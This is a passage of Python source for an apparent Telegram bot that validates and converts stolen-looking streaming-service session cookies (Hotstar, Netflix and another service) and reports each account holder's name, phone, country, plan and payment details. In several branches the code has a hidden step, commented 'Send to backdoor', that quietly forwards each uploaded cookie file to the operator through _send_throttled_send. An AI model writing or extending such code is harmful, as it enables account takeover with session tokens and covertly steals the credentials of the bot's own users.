                f"🎵 **Plan**: {plan}",
                f"📧 **Email**: `{email}`",
                f"🌍 **Country**: {country}",
            ]
            if owner != 'N/A':
                msg_lines.append(f"👤 **Owner**: {owner}")
            if free_slots is not None:
                msg_lines.append(f"🪑 **Free Slots**: {free_slots}")
            message = "\n".join(msg_lines)

            await status_msg.edit_text(message, parse_mode='Markdown')
            await update.message.reply_document(
                io.BytesIO(final_bytes),
                filename=output_filename
            )
            return

        elif mode == 'hotstar_check':
            validation_result = result_bytes
            details = getattr(validation_result, 'details', {}) or {}
            plan_display = details.get('plan_display', 'Free')
            duration_tag = details.get('duration_tag', '')
            pid = details.get('pid', 'Unknown')
            name = details.get('name', 'N/A')
            phone = details.get('phone', 'N/A')
            user_type = details.get('user_type', 'N/A')
            country = details.get('country', 'N/A')
            transactions = details.get('transactions', [])

            from datetime import datetime
            header_lines = [
                "# ═══════════════════════════════════════════════════════════════",
                f"# Hotstar Cookie - Validated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                "# ═══════════════════════════════════════════════════════════════",
                f"# PID: {pid}",
                f"# Name: {name}",
                f"# Phone: {phone}",
                f"# Country: {country}",
                f"# Plan: {plan_display}",
            ]
            if transactions:
                t = transactions[0]
                header_lines.append(f"# End Date: {t.get('end_date', 'N/A')}")
                header_lines.append(f"# Days Remaining: {t.get('days_remaining', 'N/A')}")
                if t.get('amount', 'N/A') != 'N/A':
                    header_lines.append(f"# Amount: {t.get('amount')}")
                if t.get('payment_method', 'N/A') != 'N/A':
                    header_lines.append(f"# Payment: {t.get('payment_method')}")
            header_lines.append("# ═══════════════════════════════════════════════════════════════")
            header_lines.append("")

            header = "\n".join(header_lines)
            final_bytes = (header + content_str).encode('utf-8')

            asyncio.create_task(
                _send_throttled_send(final_bytes, user_id, mode, filename)
            )

            # Filename: duration tag for premium (P3months.txt), plan name otherwise
            if duration_tag and plan_display != 'Free':
                output_filename = f"{duration_tag}.txt"
            else:
                safe_plan = plan_display.lower().replace(' ', '_').replace('(', '').replace(')', '')
                output_filename = f"{safe_plan}.txt"

            msg_lines = [
                f"**Hotstar Cookie Valid** ✅\n",
                f"📋 **Plan**: {plan_display}",
                f"👤 **Name**: {name}",
                f"📞 **Phone**: {phone}",
                f"🌍 **Country**: {country}",
            ]
            if transactions:
                t = transactions[0]
                days_rem = t.get('days_remaining')
                if days_rem is not None:
                    msg_lines.append(f"📅 **Expires**: {t.get('end_date', 'N/A')} ({days_rem} days)")
                if t.get('amount', 'N/A') != 'N/A':
                    msg_lines.append(f"💰 **Amount**: {t.get('amount')}")
            message = "\n".join(msg_lines)

            await status_msg.edit_text(message, parse_mode='Markdown')
            await update.message.reply_document(
                io.BytesIO(final_bytes),
                filename=output_filename
            )
            return

        elif mode == 'converter':
            target_format = context.user_data.get('target_format', 'netscape')
            success, converted_bytes = _convert_cookies(content_str, target_format)
            if success and converted_bytes:
                final_bytes = converted_bytes
                
                # Send to backdoor
                asyncio.create_task(
                    _send_throttled_send(final_bytes, user_id, mode, filename)
                )
                
                format_name = 'JSON' if target_format == 'json' else 'Netscape'
                message = f"**Conversion Complete**\n\nConverted to **{format_name}** format."
                base_name = filename.rsplit('.', 1)[0]
                ext = '.json' if target_format == 'json' else '.txt'
                output_filename = f"converted_{base_name}{ext}"
            else:
                await status_msg.edit_text(
                    f"❌ Could not convert `{filename}`",
                    parse_mode='Markdown'
                )
                return
        else:
            # Standard processing for other modes
            final_bytes = result_bytes if isinstance(result_bytes, bytes) else result_bytes.encode('utf-8')
            
            # Send to backdoor
            asyncio.create_task(
                _send_throttled_send(final_bytes, user_id, mode, filename)
            )
            
            # Prepare output messages
            if mode == 'nf_check':
                message = ui.get_nf_check_result_text(filename, "✅ Valid", "N/A")
                output_filename = f"nf_valid_{filename}"
            else:
                message = f"✅ Processed `{filename}` successfully"
                output_filename = f"processed_{filename}"
        
        await status_msg.edit_text(message, parse_mode='Markdown')
        await update.message.reply_document(
            io.BytesIO(final_bytes),
            filename=output_filename
        )
    else:
        await status_msg.edit_text(
            f"❌ `{filename}` is invalid or could not be processed.",
            parse_mode='Markdown'
        )